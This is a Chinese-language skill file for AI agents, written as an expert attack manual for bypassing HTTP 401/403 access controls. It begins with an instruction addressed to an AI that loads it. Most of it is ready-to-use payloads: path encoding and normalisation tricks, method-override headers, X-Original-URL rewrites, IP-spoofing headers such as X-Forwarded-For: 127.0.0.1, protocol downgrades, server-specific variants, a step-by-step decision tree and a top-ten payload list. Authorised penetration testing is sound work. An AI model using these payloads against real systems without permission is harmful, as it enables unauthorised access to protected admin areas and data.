# 技能：401/403 跳过技术 — 专家攻击手册

> **AI 加载指令**：全面的 401/403 禁止跳过技术。涵盖路径规范化技巧、HTTP 方法覆盖、基于头的跳过（X-Original-URL、X-Forwarded-For）、协议版本技巧和组合攻击。基础模型通常知道 2-3 种头跳过，但会遗漏路径操作变体和动词+路径组合的完整矩阵。

## 0. 相关路由

- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — 更广泛的认证跳过（登录缺陷、会话处理）
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — 当跳过是特定于 WAF 而非访问控制时
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) — 通过 Host 头操作进行路由跳过
- [request-smuggling](../request-smuggling/SKILL.md) — 完全绕过访问控制
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — h2c 滥用以绕过代理 ACL

---

## 1. 路径操作跳过

核心思想：反向代理/WAF 检查一种路径格式，但后端进行不同规范化。

### 1.1 尾随斜杠 / 缺失斜杠

```
/admin      → 403
/admin/     → 200  ✓ (尾随斜杠)
/admin/.    → 200  ✓ (尾随点)
```

### 1.2 大小写敏感

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

在以下情况下有效：代理规则大小写敏感，但后端不敏感（Windows/IIS 上常见）。

### 1.3 URL 编码

```
/admin          → 403
/%61dmin        → 200  ✓ (编码 'a')
/admi%6e        → 200  ✓ (编码 'n')
/%61%64%6d%69%6e → 200  ✓ (完全编码)
```

### 1.4 双 URL 编码

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %，解码两次：%61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

### 1.5 Unicode / UTF-8 编码

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (过长的 UTF-8 用于 '.')
/admi%C0%6E     → 200  ✓ (过长编码)
/%C0%AFadmin    → 200  ✓ (过长的 '/' )
```

### 1.6 点段 / 路径遍历

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat 路径参数)
```

### 1.7 空字节

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

### 1.8 路径参数注入

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java 将 ; 视为路径参数)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

### 1.9 尾随特殊字符

```
/admin%20 (空格)  /admin%09 (制表符)   /admin? (空查询)
/admin.json        /admin.html       /admin/~
```

### 1.10 反斜杠 (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 组合路径技巧

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

---

## 2. HTTP 方法跳过

### 2.1 直接方法更改

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (可能泄露允许的方法)
TRACE /admin → 200  ✓ (可能反射头 — XST)
HEAD /admin → 200  ✓ (与 GET 相同但无正文 — 确认访问)
```

### 2.2 方法覆盖头

当代理按方法阻止，但后端读取覆盖头时：

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (在 POST 正文 — Rails, Laravel)
```

### 2.3 自定义 / 无效方法

```
FOOBAR /admin HTTP/1.1     → 某些 ACL 仅检查 GET/POST
GETS /admin HTTP/1.1       → 类似于拼错的动词可能跳过
CONNECT /admin HTTP/1.1    → 代理可能隧道
PROPFIND /admin HTTP/1.1   → WebDAV 方法
MOVE /admin HTTP/1.1       → WebDAV 方法
```

---

## 3. 基于头的跳过

### 3.1 URL 重写头 (Nginx/IIS)

这些头告诉后端“真实”的 URL，绕过代理级别的路径检查：

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

代理看到 `GET /`（允许），但后端路由到 `/admin`。

### 3.2 IP 欺骗头 (白名单跳过)

尝试以下头（每个值的 `127.0.0.1`、`10.0.0.1`、`0.0.0.0`、`::1`）：

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP 编码变体：`0177.0.0.1`（八进制）、`2130706433`（十进制）、`0x7f000001`（十六进制）、`localhost`

### 3.3 其他头技巧

```http
Referer: https://target.com/admin     # Referrer 检查跳过
Origin: https://target.com             # Origin 检查跳过
Host: localhost                         # Host 头操作
X-Forwarded-Host: localhost            # 转发主机
Content-Type: application/json         # 内容类型切换
X-Requested-With: XMLHttpRequest       # AJAX 标志
```

---

## 4. 协议版本跳过

```http
# HTTP/1.0 (某些 ACL 仅适用于 HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (非常遗留 — 无头)
GET /admin

# HTTP/2 伪头技巧
:method: GET
:path: /admin
:authority: target.com
# 参考 ../http2-specific-attacks/SKILL.md 获取 H2 特定跳过
```

---

## 5. 动词篡改 + 路径组合

组合多种技术以提高成功率：

```http
POST / HTTP/1.1                          # 方法覆盖 + URL 重写
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP 欺骗 + 路径编码
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # 协议 + 大小写 + IP 欺骗
X-Forwarded-For: 127.0.0.1
```

---

## 6. 技术特定跳过

| 服务器 | 关键技巧 |
|---|---|
| **Apache** | `/admin/` (尾随斜杠), `/.admin` (点前缀), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (大小写), `/admin../` (规范化), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (路径参数+扩展), `/admin\` (反斜杠), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (路径参数), `/admin..;/` (遍历), `/;/admin` (空参数) |
| **Spring** | `/admin.anything` (后缀匹配，旧版), `/admin/` (尾随斜杠) |

---

## 7. 自动化工具

| 工具 | 目的 | URL |
|---|---|---|
| **byp4xx** | 全面 403 跳过扫描器 | github.com/lobuhi/byp4xx |
| **403bypasser** | 自动化头/路径/方法跳过 | github.com/sting8k/403bypasser |
| **dirsearch** | 带编码变体的目录暴力破解 | github.com/maurosoria/dirsearch |
| **feroxbuster** | 递归内容发现 | github.com/epi052/feroxbuster |
| **Burp Intruder** | 用于手动测试的自定义载荷列表 | portswigger.net |

### byp4xx 使用

```bash
# 基本使用
./byp4xx.sh https://target.com/admin

# 输出显示所有尝试的跳过及其响应码
# 200/301/302 响应 = 可能找到跳过
```

---

## 8. 决策树

```
在路径上得到 401 或 403？
│
├── 首先尝试路径操作（最高成功率）
│   ├── /path/      (尾随斜杠)
│   ├── /PATH       (大小写更改)
│   ├── /path%20    (尾随空格)
│   ├── /./path     (点段)
│   ├── //path      (双斜杠)
│   ├── /path;x     (路径参数 — Java/Tomcat)
│   ├── /path..;/   (Tomcat 特定)
│   ├── /%2e/path   (编码点)
│   ├── /path%00    (空字节)
│   ├── /path%23    (编码哈希)
│   └── 结果? → 200 = 找到跳过
│
├── 路径技巧失败 → 尝试方法跳过
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (与 GET 无正文相同)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (可能反射认证头 — XST)
│
├── 方法技巧失败 → 尝试头跳过
│   ├── X-Original-URL: /path      (Nginx/IIS 重写)
│   ├── X-Rewrite-URL: /path       (相同概念)
│   ├── X-Forwarded-For: 127.0.0.1 (IP 白名单)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── 头技巧失败 → 尝试协议跳过
│   ├── HTTP/1.0 而非 1.1
│   ├── HTTP/2 h2c 滥用 (../http2-specific-attacks/)
│   └── WebSocket 升级
│
├── 单一技巧失败 → 尝试组合
│   ├── 方法 + 路径: POST /PATH/
│   ├── 头 + 路径: X-Forwarded-For + /path%20
│   ├── 全部三个: POST + X-Original-URL + IP 头
│   └── 协议 + 路径: HTTP/1.0 + 编码路径
│
├── 所有跳过失败 → 考虑替代方法
│   ├── 请求走私 (../request-smuggling/) → 走私过 ACL
│   ├── SSRF (../ssrf-server-side-request-forgery/) → 从服务器访问
│   ├── IDOR (../idor-broken-object-authorization/) → 直接访问数据
│   └── 认证缺陷 (../authbypass-authentication-flaws/) → 登录绕过
│
└── 使用 byp4xx / 403bypasser 进行自动化扫描以完整性
```

---

## 9. 快速参考 — 关键载荷

```http
# 前 10 个快速获胜（首先尝试这些）
GET /admin/     HTTP/1.1        # 尾随斜杠
GET /Admin      HTTP/1.1        # 大小写更改
GET /admin%20   HTTP/1.1        # 尾随空格
GET /./admin    HTTP/1.1        # 点段
GET //admin     HTTP/1.1        # 双斜杠
POST /admin     HTTP/1.1        # 方法更改
GET / HTTP/1.1                  # X-Original-URL 跳过
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP 白名单跳过
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS 路径参数
GET /admin..;/ HTTP/1.1         # Tomcat 跳过
```
